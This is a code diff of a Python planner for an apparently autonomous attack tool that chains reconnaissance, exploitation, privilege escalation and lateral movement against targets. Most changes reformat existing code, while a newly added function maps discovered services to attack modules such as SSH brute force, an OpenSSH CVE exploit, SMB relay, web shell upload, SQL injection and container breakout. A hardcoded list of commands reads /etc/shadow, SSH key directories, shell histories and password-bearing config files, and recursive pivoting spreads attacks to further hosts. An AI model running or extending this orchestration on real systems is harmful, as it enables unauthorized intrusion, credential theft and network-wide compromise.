@@ -6,17 +6,9 @@ import asyncio
 import re
 from typing import Any
 
-from tools.attack_modules import find_modules, find_producers
+from tools.attack_modules import find_modules, find_producers, get_module
 from tools.attack_ui import get_ui
-from tools.campaign.state import (
-    AggressionLevel,
-    AttackPhase,
-    AttackState,
-    AttackTask,
-    RetryEngine,
-    TaskStatus,
-    _report_autonomous_progress,
-)
+from tools.campaign.state import AggressionLevel, AttackPhase, AttackState, AttackTask, RetryEngine, TaskStatus, _report_autonomous_progress
 from tools.exceptions import _EXC_GROUP_CATCH
 from tools.logging_setup import get_logger
 from tools.validation_utils import is_local_target
@@ -64,19 +56,10 @@ class PlannerMixin:
 
     def _module_context(self, state: AttackState, task: AttackTask | None = None):  # type: ignore[override]
         from tools.attack_modules import ModuleContext
-
         services_full: list[dict[str, Any]] = []
         cves: list[str] = []
         for s in state.recon_result.services if state.recon_result else []:
-            services_full.append(
-                {
-                    "service": s.service,
-                    "port": f"{s.port}/{s.protocol}",
-                    "version": s.version,
-                    "cpe": list(s.cpe),
-                    "banner": s.banner,
-                }
-            )
+            services_full.append({"service": s.service, "port": f"{s.port}/{s.protocol}", "version": s.version, "cpe": list(s.cpe), "banner": s.banner})
             openssh = s.scripts.get("openssh_cves", [])
             if isinstance(openssh, str):
                 cves.extend(re.findall(r"CVE-\d{4}-\d{4,}", openssh, re.IGNORECASE))
@@ -88,41 +71,15 @@ class PlannerMixin:
                     continue
                 if isinstance(val, str):
                     cves.extend(re.findall(r"CVE-\d{4}-\d{4,}", val, re.IGNORECASE))
-        return ModuleContext(
-            target_ip=state.target,
-            target_os=state.recon_result.os_family if state.recon_result else "",
-            services=services_full,
-            cves=sorted(set(cves)),
-            credentials=list(state.credentials_found),
-            config=self._mission,
-            parameters=dict(task.parameters) if task is not None else {},
-            access_achieved=state.access_achieved,
-            privilege_level=state.privilege_level,
-            sessions=([{"shell": state.shell_type}] if state.access_achieved and state.shell_type else []),
-            phase=state.current_phase.value,
-            evidence_refs=list(state.loot)[-10:],
-        )
+        return ModuleContext(target_ip=state.target, target_os=state.recon_result.os_family if state.recon_result else "", services=services_full, cves=sorted(set(cves)), credentials=list(state.credentials_found), config=self._mission, parameters=dict(task.parameters) if task is not None else {}, access_achieved=state.access_achieved, privilege_level=state.privilege_level, sessions=([{"shell": state.shell_type}] if state.access_achieved and state.shell_type else []), phase=state.current_phase.value, evidence_refs=list(state.loot)[-10:])
 
     async def _phase_local_takeover(self, state: AttackState) -> None:
         logger.info(f"[LOCAL] Target {state.target} is this host -- local-takeover phase")
         ui.phase_change("local_takeover")
         state.current_phase = AttackPhase.PRIVILEGE_ESCALATION
         _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
-        state.add_timeline_event(
-            "local_takeover", "Local-target playbook: filesystem enumeration + privilege escalation"
-        )
-        local_cmds = [
-            "cat /etc/passwd",
-            "sudo -n cat /etc/shadow 2>/dev/null",
-            "ls -la /home/*/.ssh /root/.ssh 2>/dev/null",
-            "find / -perm -4000 -type f 2>/dev/null",
-            "find / -perm -2000 -type f 2>/dev/null",
-            "find / -writable -type d 2>/dev/null | head",
-            "cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null",
-            "ls -la /opt /srv /var/www /etc/mysql",
-            "grep -rIl 'password' /etc/ 2>/dev/null | head",
-            "env; cat ~/.bash_history ~/.zsh_history 2>/dev/null",
-        ]
+        state.add_timeline_event("local_takeover", "Local-target playbook: filesystem enumeration + privilege escalation")
+        local_cmds = ["cat /etc/passwd", "sudo -n cat /etc/shadow 2>/dev/null", "ls -la /home/*/.ssh /root/.ssh 2>/dev/null", "find / -perm -4000 -type f 2>/dev/null", "find / -perm -2000 -type f 2>/dev/null", "find / -writable -type d 2>/dev/null | head", "cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null", "ls -la /opt /srv /var/www /etc/mysql", "grep -rIl 'password' /etc/ 2>/dev/null | head", "env; cat ~/.bash_history ~/.zsh_history 2>/dev/null"]
         if self._tool_executor:
             for cmd in local_cmds:
                 try:
@@ -131,9 +88,7 @@ class PlannerMixin:
                 except _EXC_GROUP_CATCH as exc:
                     state.add_timeline_event("local_read_err", f"{cmd}: {exc}")
         else:
-            state.add_timeline_event(
-                "local_read_skipped", "No tool_executor wired -- privesc modules still run local enumeration"
-            )
+            state.add_timeline_event("local_read_skipped", "No tool_executor wired -- privesc modules still run local enumeration")
         await self._phase_privilege_escalation(state)
 
     async def _phase_reconnaissance(self, state: AttackState) -> None:
@@ -143,23 +98,13 @@ class PlannerMixin:
         _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
         state.add_timeline_event("phase_start", "Reconnaissance phase started")
         if state.recon_result and state.recon_result.open_ports:
-            logger.info(
-                f"[RECON] Resuming with prior recon ({len(state.recon_result.open_ports)} ports) — skipping re-scan"
-            )
-            state.add_timeline_event(
-                "recon_reused",
-                f"Reused prior recon with {len(state.recon_result.open_ports)} open ports",
-                {"ports": state.recon_result.open_ports, "resumed": True},
-            )
+            logger.info(f"[RECON] Resuming with prior recon ({len(state.recon_result.open_ports)} ports) — skipping re-scan")
+            state.add_timeline_event("recon_reused", f"Reused prior recon with {len(state.recon_result.open_ports)} open ports", {"ports": state.recon_result.open_ports, "resumed": True})
             return
         recon_result = await self._recon.recon_host(state.target)
         state.recon_result = recon_result
         if recon_result.open_ports:
-            state.add_timeline_event(
-                "recon_complete",
-                f"Found {len(recon_result.open_ports)} open ports",
-                {"ports": recon_result.open_ports, "services": [s.service for s in recon_result.services]},
-            )
+            state.add_timeline_event("recon_complete", f"Found {len(recon_result.open_ports)} open ports", {"ports": recon_result.open_ports, "services": [s.service for s in recon_result.services]})
             logger.info(f"[RECON] Found {len(recon_result.open_ports)} ports on {state.target}")
         else:
             state.add_timeline_event("recon_empty", "No open ports found")
@@ -167,20 +112,13 @@ class PlannerMixin:
             try:
                 from tools.mcp_shared import add_discovered_target
                 from tools.validation_utils import is_fqdn, is_subdomain_of, resolve_target_to_ip
-
                 if is_fqdn(state.original_target):
-                    logger.info(
-                        f"[RECON] Domain target {state.original_target} -- expanding attack surface via subdomain enumeration"
-                    )
+                    logger.info(f"[RECON] Domain target {state.original_target} -- expanding attack surface via subdomain enumeration")
                     import json as _json
                     import urllib.request as _urlreq
-
                     dom = state.original_target.strip().lower()
                     try:
-                        req = _urlreq.Request(
-                            f"https://crt.sh/?q=%25.{dom}&output=json",
-                            headers={"User-Agent": "NetAttackAi-Orchestrator/1.0"},
-                        )
+                        req = _urlreq.Request(f"https://crt.sh/?q=%25.{dom}&output=json", headers={"User-Agent": "NetAttackAi-Orchestrator/1.0"})
                         with _urlreq.urlopen(req, timeout=20) as resp:  # noqa: S310
                             body = resp.read().decode(errors="replace")
                         subs: set[str] = set()
@@ -199,14 +137,8 @@ class PlannerMixin:
                     except _EXC_GROUP_CATCH as exc:
                         logger.warning(f"[RECON] Subdomain expansion failed for {dom}: {exc}")
                     if state.discovered_subdomains:
-                        state.add_timeline_event(
-                            "subdomain_expansion",
-                            f"Discovered {len(state.discovered_subdomains)} subdomains",
-                            {"subdomains": state.discovered_subdomains[:20]},
-                        )
-                        logger.info(
-                            f"[RECON] Discovered {len(state.discovered_subdomains)} subdomains of {state.original_target}"
-                        )
+                        state.add_timeline_event("subdomain_expansion", f"Discovered {len(state.discovered_subdomains)} subdomains", {"subdomains": state.discovered_subdomains[:20]})
+                        logger.info(f"[RECON] Discovered {len(state.discovered_subdomains)} subdomains of {state.original_target}")
             except _EXC_GROUP_CATCH as exc:
                 logger.warning(f"[RECON] Domain expansion hook failed: {exc}")
 
@@ -224,9 +156,7 @@ class PlannerMixin:
         if skip_failed:
             failed = set(state.failed_attempts.keys())
             scored_modules = [(s, m) for (s, m) in scored_modules if m.name not in failed]
-            logger.info(
-                f"[EXPLOIT] Adaptive replan: {len(scored_modules)} modules after dropping {len(failed)} previously-failed"
-            )
+            logger.info(f"[EXPLOIT] Adaptive replan: {len(scored_modules)} modules after dropping {len(failed)} previously-failed")
         logger.info(f"[EXPLOIT] {len(scored_modules)} applicable modules found")
         tasks: list[AttackTask] = []
         ranked_names: set[tuple[str, str]] = set()
@@ -237,15 +167,7 @@ class PlannerMixin:
                     _port = f"{s.port}/{s.protocol}"
                     break
             ranked_names.add((module.name, _port))
-            task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.EXPLOITATION,
-                module_name=module.name,
-                target=state.target,
-                parameters={"score": score, **module.to_json()},
-                aggression=state.aggression,
-                priority=score,
-            )
+            task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name=module.name, target=state.target, parameters={"score": score, **module.to_json()}, aggression=state.aggression, priority=score)
             tasks.append(task)
             self._tasks[task.task_id] = task
         service_tasks = self._create_service_specific_tasks(state)
@@ -282,32 +204,16 @@ class PlannerMixin:
                 privesc_modules += ["CloudPrivesc", "K8sPrivesc", "IMDSExploit", "DockerSockEscape", "S3BucketTakeover"]
         tasks: list[AttackTask] = []
         for mod_name in privesc_modules:
-            task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.PRIVILEGE_ESCALATION,
-                module_name=mod_name,
-                target=state.target,
-                aggression=state.aggression,
-                priority=80,
-            )
+            task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.PRIVILEGE_ESCALATION, module_name=mod_name, target=state.target, aggression=state.aggression, priority=80)
             tasks.append(task)
             self._tasks[task.task_id] = task
         await self._execute_task_batch(tasks, state)
         auto_les = getattr(self, "_auto_local_exploit_suggester", False)
         if auto_les and state.access_achieved:
-            les_task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.PRIVILEGE_ESCALATION,
-                module_name="LocalExploitSuggester",
-                target=state.target,
-                aggression=state.aggression,
-                priority=60,
-            )
+            les_task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.PRIVILEGE_ESCALATION, module_name="LocalExploitSuggester", target=state.target, aggression=state.aggression, priority=60)
             self._tasks[les_task.task_id] = les_task
             await self._executor.execute(les_task, state)
-            state.add_timeline_event(
-                "local_exploit_suggester", "Advisory local_exploit_suggester follow-up dispatched (info-only)"
-            )
+            state.add_timeline_event("local_exploit_suggester", "Advisory local_exploit_suggester follow-up dispatched (info-only)")
 
     async def _phase_lateral_movement(self, state: AttackState, _depth: int = 0) -> None:
         logger.info(f"[LATERAL] Starting lateral movement from {state.target} (pivot depth {_depth})")
@@ -316,24 +222,14 @@ class PlannerMixin:
         _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
         state.add_timeline_event("phase_start", "Lateral movement phase started")
         if is_local_target(state.target):
-            state.add_timeline_event(
-                "lateral_skip_local", "Skipping lateral movement -- target is this host (no pivot from self)"
-            )
+            state.add_timeline_event("lateral_skip_local", "Skipping lateral movement -- target is this host (no pivot from self)")
             logger.info(f"[LATERAL] Skipping lateral movement for local target {state.target}")
             return
         for pivot in state.pivot_targets[:5]:
             if pivot in self._states:
                 state.add_timeline_event("lateral_skip", f"Skipping already-attacked pivot {pivot}")
                 continue
-            task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.LATERAL_MOVEMENT,
-                module_name="LateralMovement",
-                target=pivot,
-                parameters={"source": state.target},
-                aggression=state.aggression,
-                priority=70,
-            )
+            task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.LATERAL_MOVEMENT, module_name="LateralMovement", target=pivot, parameters={"source": state.target}, aggression=state.aggression, priority=70)
             self._tasks[task.task_id] = task
             result = await self._executor.execute(task, state)
             if result.get("success"):
@@ -341,10 +237,7 @@ class PlannerMixin:
                 if _depth + 1 < self._max_pivot_depth:
                     await self._attack_target(pivot, _depth=_depth + 1)
                 else:
-                    state.add_timeline_event(
-                        "pivot_depth_cap",
-                        f"Pivot-depth cap ({self._max_pivot_depth}) reached; not recursing into {pivot}",
-                    )
+                    state.add_timeline_event("pivot_depth_cap", f"Pivot-depth cap ({self._max_pivot_depth}) reached; not recursing into {pivot}")
                     logger.info(f"[LATERAL] Pivot-depth cap reached at {pivot} (depth {_depth + 1})")
             else:
                 state.add_timeline_event("lateral_failed", f"Failed to move to {pivot}: {result.get('error')}")
@@ -356,14 +249,7 @@ class PlannerMixin:
         _report_autonomous_progress(phase=state.current_phase.value, target=state.target)
         state.add_timeline_event("phase_start", "Validation phase started")
         for exploit in state.successful_exploits:
-            task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.VALIDATION,
-                module_name="ValidateFinding",
-                target=state.target,
-                parameters={"exploit": exploit},
-                priority=90,
-            )
+            task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.VALIDATION, module_name="ValidateFinding", target=state.target, parameters={"exploit": exploit}, priority=90)
             self._tasks[task.task_id] = task
             await self._executor.execute(task, state)
 
@@ -378,12 +264,8 @@ class PlannerMixin:
             await self._phase_exploitation(state, skip_failed=True)
             _after = len(self._tasks)
             if _after == _before and not state.access_achieved:
-                logger.info(
-                    f"[ADAPTIVE] {state.target} round {rounds}: no novel candidate modules remain and no access achieved; stopping."
-                )
-                state.add_timeline_event(
-                    "adaptive_stop", "No novel candidate modules remain; stopping adaptive rounds."
-                )
+                logger.info(f"[ADAPTIVE] {state.target} round {rounds}: no novel candidate modules remain and no access achieved; stopping.")
+                state.add_timeline_event("adaptive_stop", "No novel candidate modules remain; stopping adaptive rounds.")
                 break
             if state.access_achieved and state.privilege_level not in ("system", "root", "admin"):
                 await self._phase_privilege_escalation(state)
@@ -393,14 +275,8 @@ class PlannerMixin:
             if not state.access_achieved:
                 state.hard_target_rounds += 1
                 if self._hard_target_max_rounds and state.hard_target_rounds >= self._hard_target_max_rounds:
-                    logger.info(
-                        f"[ADAPTIVE] {state.target} gave up after {state.hard_target_rounds} rounds with no access (hard_target_max_rounds={self._hard_target_max_rounds})"
-                    )
-                    state.add_timeline_event(
-                        "hard_target_give_up",
-                        f"Target {state.target} produced no access in {state.hard_target_rounds} adaptive rounds; giving up to preserve campaign budget for remaining targets.",
-                        {"rounds": state.hard_target_rounds},
-                    )
+                    logger.info(f"[ADAPTIVE] {state.target} gave up after {state.hard_target_rounds} rounds with no access (hard_target_max_rounds={self._hard_target_max_rounds})")
+                    state.add_timeline_event("hard_target_give_up", f"Target {state.target} produced no access in {state.hard_target_rounds} adaptive rounds; giving up to preserve campaign budget for remaining targets.", {"rounds": state.hard_target_rounds})
                     break
             if not state.should_continue():
                 break
@@ -416,14 +292,11 @@ class PlannerMixin:
             chains.append([tail, f"pivot:{pivot}"])
         if chains:
             state.attack_paths.extend(chains)
-            state.add_timeline_event(
-                "vuln_chain_scheduled", f"Scheduled {len(chains)} vuln-chain step(s) from {tail}", {"chains": chains}
-            )
+            state.add_timeline_event("vuln_chain_scheduled", f"Scheduled {len(chains)} vuln-chain step(s) from {tail}", {"chains": chains})
 
     async def _execute_task_batch(self, tasks: list[AttackTask], state: AttackState) -> None:
         semaphore = asyncio.Semaphore(3)
         prereq_scheduled: set[str] = set()
-
         async def run_task(task: AttackTask) -> None:
             while True:
                 async with semaphore:
@@ -434,19 +307,14 @@ class PlannerMixin:
                         if prereq_task is not None:
                             prereq_scheduled.add(task.task_id)
                             await run_task(prereq_task)
-                    if RetryEngine.should_retry(
-                        task.module_name, result.get("error", ""), task.retry_count, task.max_retries
-                    ):
+                    if RetryEngine.should_retry(task.module_name, result.get("error", ""), task.retry_count, task.max_retries):
                         task.retry_count += 1
                         task.parameters.update(RetryEngine.get_retry_parameters(task.module_name, task.retry_count))
                         task.status = TaskStatus.RETRYING
-                        logger.info(
-                            f"Retrying {task.module_name} with modified parameters (attempt {task.retry_count})"
-                        )
+                        logger.info(f"Retrying {task.module_name} with modified parameters (attempt {task.retry_count})")
                         await asyncio.sleep(2**task.retry_count)
                         continue
                 return
-
         await asyncio.gather(*[run_task(t) for t in tasks], return_exceptions=True)
 
     _PREREQ_KIND_PATTERNS: tuple[tuple[re.Pattern[str], tuple[str, ...]], ...] = (
@@ -466,12 +334,10 @@ class PlannerMixin:
     def _maybe_schedule_prereq(self, task: AttackTask, state: AttackState, error: str) -> AttackTask | None:
         try:
             from tools.failure_taxonomy import FailureClass, classify_failure
-
             fc = classify_failure(error)
         except _EXC_GROUP_CATCH:
             return None
         from tools.failure_taxonomy import FailureClass
-
         if fc != FailureClass.PREREQUISITE_MISSING:
             return None
         kinds = self._prereq_artifact_kinds(error)
@@ -483,20 +349,10 @@ class PlannerMixin:
             for mod in find_producers(kind):
                 if mod.name == task.module_name:
                     continue
-                prereq_task = AttackTask(
-                    task_id=self._new_task_id(),
-                    phase=task.phase,
-                    module_name=mod.name,
-                    target=state.target,
-                    aggression=task.aggression,
-                    priority=min(100, task.priority + 10),
-                    created_from="recovery:prerequisite",
-                )
+                prereq_task = AttackTask(task_id=self._new_task_id(), phase=task.phase, module_name=mod.name, target=state.target, aggression=task.aggression, priority=min(100, task.priority + 10), created_from="recovery:prerequisite")
                 self._tasks[prereq_task.task_id] = prereq_task
                 self._prereq_tasks_added += 1
-                logger.info(
-                    f"[RECOVERY] Scheduled prerequisite producer {mod.name} (produces {kind}) for failed {task.module_name} ({error!r})"
-                )
+                logger.info(f"[RECOVERY] Scheduled prerequisite producer {mod.name} (produces {kind}) for failed {task.module_name} ({error!r})")
                 return prereq_task
         return None
 
@@ -505,25 +361,44 @@ class PlannerMixin:
         failed_modules = {m for m in all_failed if len(state.failed_attempts.get(m, [])) < self._max_module_failures}
         dropped = all_failed - failed_modules
         if dropped:
-            logger.info(
-                f"Not retrying {len(dropped)} module(s) at failure cap ({self._max_module_failures}): {sorted(dropped)}"
-            )
+            logger.info(f"Not retrying {len(dropped)} module(s) at failure cap ({self._max_module_failures}): {sorted(dropped)}")
         tasks: list[AttackTask] = []
         for mod_name in failed_modules:
-            task = AttackTask(
-                task_id=self._new_task_id(),
-                phase=AttackPhase.EXPLOITATION,
-                module_name=mod_name,
-                target=state.target,
-                aggression=state.aggression,
-                priority=60,
-                max_retries=2,
-            )
+            task = AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name=mod_name, target=state.target, aggression=state.aggression, priority=60, max_retries=2)
             tasks.append(task)
             self._tasks[task.task_id] = task
         if tasks:
             logger.info(f"Retrying {len(tasks)} failed modules with {state.aggression.value} aggression")
             await self._execute_task_batch(tasks, state)
+
+    def _create_service_specific_tasks(self, state: AttackState) -> list[AttackTask]:
+        tasks: list[AttackTask] = []
+        if not state.recon_result:
+            return tasks
+        for svc in state.recon_result.services:
+            service = svc.service.lower()
+            port = svc.port
+            if service == "ssh":
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="SSHBruteForce", target=state.target, parameters={"port": port, "version": svc.version}, priority=75))
+                if "CVE-2024-6387" in str(svc.scripts.get("openssh_cves", "")):
+                    tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="RegreSSHion", target=state.target, parameters={"port": port}, priority=95))
+            elif service in ("microsoft-ds", "smb", "netbios-ssn"):
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="SMBRelay", target=state.target, parameters={"port": port}, priority=70))
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="SMBNullSession", target=state.target, parameters={"port": port}, priority=65))
+            elif service in ("http", "https", "http-proxy"):
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="WebShellUpload", target=state.target, parameters={"port": port, "scheme": service}, priority=70))
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="SQLInjection", target=state.target, parameters={"port": port, "scheme": service}, priority=65))
+            elif service == "ftp":
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="FTPAnonymous", target=state.target, parameters={"port": port}, priority=60))
+            elif service == "redis":
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="RedisExploit", target=state.target, parameters={"port": port}, priority=75))
+            elif port in (2375, 2376, 6443, 10250):
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="ContainerBreakout", target=state.target, parameters={"port": port}, priority=80))
+            elif service in ("ms-wbt-server", "rdp"):
+                tasks.append(AttackTask(task_id=self._new_task_id(), phase=AttackPhase.EXPLOITATION, module_name="RDPExploit", target=state.target, parameters={"port": port}, priority=70))
+        for task in tasks:
+            self._tasks[task.task_id] = task
+        return tasks
 
     async def _attack_target(self, target: str, *, _depth: int = 0) -> dict[str, Any]:  # type: ignore[override]
         if not self._running:
@@ -548,14 +423,8 @@ class PlannerMixin:
         else:
             await self._phase_exploitation(state)
             if not state.access_achieved and self._hard_target_max_rounds and state.aggression >= self._max_aggression:
-                logger.info(
-                    f"[HARD] {state.target} at max aggression with no access -- giving up (hard_target_max_rounds={self._hard_target_max_rounds})"
-                )
-                state.add_timeline_event(
-                    "hard_target_give_up",
-                    f"Target {state.target} reached max aggression ({state.aggression.value}) with no access; giving up.",
-                    {"aggression": state.aggression.value},
-                )
+                logger.info(f"[HARD] {state.target} at max aggression with no access -- giving up (hard_target_max_rounds={self._hard_target_max_rounds})")
+                state.add_timeline_event("hard_target_give_up", f"Target {state.target} reached max aggression ({state.aggression.value}) with no access; giving up.", {"aggression": state.aggression.value})
             if state.access_achieved and state.privilege_level not in ("system", "root", "admin"):
                 await self._phase_privilege_escalation(state)
             if state.pivot_targets:
